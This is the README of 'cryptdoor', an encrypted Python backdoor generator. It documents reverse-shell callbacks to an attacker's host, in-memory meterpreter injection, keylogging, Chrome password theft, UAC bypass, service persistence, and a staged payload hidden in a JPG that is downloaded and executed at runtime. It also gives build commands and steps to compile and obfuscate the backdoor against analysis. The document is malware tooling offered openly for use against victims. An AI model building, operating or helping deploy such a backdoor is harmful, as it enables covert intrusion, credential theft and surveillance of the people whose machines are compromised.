cryptdoor
=========

AES encrypted python backdoor that communicates only AES encrypted traffic.  
Shell has the ability to spawn a meterpreter reverse_tcp into memory using VirtualAlloc (taken from Veil-Evasion).  
We can also download and upload files over the secure AES encrypted connection.  
Keylogging is implemented for windows using pyHook.  
All traffic apart from traffic meterpreter makes are encrypted with AES.  
On top of this all of the imports are randomized, and the script is encrypted with AES and decrypts 
itself in memory at runtime (taken from pyherion).  

Staged payload
=========

The main body of backdoor code is hosted at a url and download at runtime by the backdoor.py stub.  
This means that the actual backdoor code only exists in the victim memory.  
The backdoor payload can be hosted on tempsend.com or at a custom url and downloaded and exec'ed at runtime by the 
backdoor.py script.  
This means the actual backdoor code is not included in the final backdoor.py and is therefore further resistant to 
analysis.  
The code will be hidden in a jpg that remains valid so it can be viewed.  
The key for decrypting the payload code is kept in the downloader, so if anyone finds it online, they will not be able
to decrypt it.

Usage
=========

        usage: ./cryptdoor.py [options]

        optional arguments:
          -h, --help            show this help message and exit
          -i HOSTNAME, --hostname HOSTNAME
                                Ip or hostname to connect back to.
          -p PORT, --port PORT  Port to connect back to.
          -e EXPIRE, --expire EXPIRE
                        Payload Life: h=hour, d=day, w=week, m=month
          -u CUSTOMURL, --customurl CUSTOMURL
                        Host the generated jpg at this url.
          -a, --persistence     Enable Auto-persistence.
          -b BACKDOORNAME, --backdoorname BACKDOORNAME
                                Name of backdoor (default backdoor.py).
          -s SERVERNAME, --servername SERVERNAME
                                Name of server (default server.py).


cryptdoor.py will make the backdoor and server.
The syntax is:

        ./cryptdoor.py -i host -p port

You can add a -a to attempt automatic persistence:

        ./cryptdoor.py -i host -p port -a

host and port refer to the host and port of the listening server (attacker).  
These are the options you have from within the shell:

	AES-shell options:
    	 download file       -  Download a file from remote pwd to localhost.
    	 upload filepath     -  Upload a filepath to remote pwd.
    	 run commands        -  Run a command in the background.
         wget url            -  Download a file from url to remote pwd.
         tempsend file       -  Upload a file from remote pwd to tempsend.com

	Windows Only:
    	 persistence         -  Install exe as a system service backdoor.
    	 unpersist           -  Remove persistence and exit.
    	 meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port.
    	 keyscan             -  Start recording keystrokes.
    	 keydump             -  Dump recorded keystrokes.
    	 keyclear            -  Clear the keystroke buffer.
    	 chromepass          -  Retrieve chrome stored passwords.
    	 bypassuac cmds      -  Run commands as admin.
    	 proxyupdate file    -  Update proxy list from file.

Compilation
=========

The backdoor script can be compiled to a standalone PE executable using pyinstaller on windows.

1. Install python27: https://www.python.org/ftp/python/2.7.8/python-2.7.8.msi
2. Run this script to install pip: https://bootstrap.pypa.io/get-pip.py
3. Press Windows Key+Pause, then "Advanced system settings" then "Environment Variables"
4. You might or not have a "PATH" variable listed there if not add one and write

        "C:\Python27;C:\Python27\Scripts"

If you do already have one just add a colon before adding this to the variable like:

        "C:\oldpath;C:\Python27;C\Python27\Scripts"

5. Open a new cmd terminal and you should be able to:

        pip install pyinstaller pycrypto requests

6. Add ';C:\Python27\Lib\site-packages\PyInstaller' to the end of your PATH variable
7. Install pyHook: http://sourceforge.net/projects/pyhook/files/latest/download
8. Install pywin32: http://sourceforge.net/projects/pywin32/files/pywin32/
9. Place the socks.py file in the same directory as backdoor.py if you want to use a proxy.
10. Open a new cmd terminal and cd to wherever backdoor.py is.

        pyinstaller -F -w backdoor.py

11. That's it, enjoy your exe in dist.

Advanced Compilation
=========

You can compile the exe with optimized python files with:

        python -O C:\Python27\Scripts\pyinstaller-script.py -F -w backdoor.py

If you want to upx pack the final exe to decrease final size include tools/upx.exe in the same directory as backdoor.py when you compile with pyinstaller.

Proxies
=========  

NOTE: Proxying is temporarily disabled. Will be back soon.

If you wish to have your backdoor connect back to you through a HTTP/s proxy, there a few things we have to do:

1. Edit the stubs/backdoor.py script from line 310-311, and fill in the values for the proxy details.

2. Get a DDNS pointed at your IP (proxying will not work without one).

3. Then generate your backdoor with the -x switch and replace the IP with your DDNS hostname:

	./cryptdoor.py -i DDNS -p port -x

HTTP proxying is acheived using:

https://github.com/Anorov/PySocks


Obfuscation
=========

Obfuscation of the backdoor source code is acheived using:

https://github.com/astrand/pyobfuscate
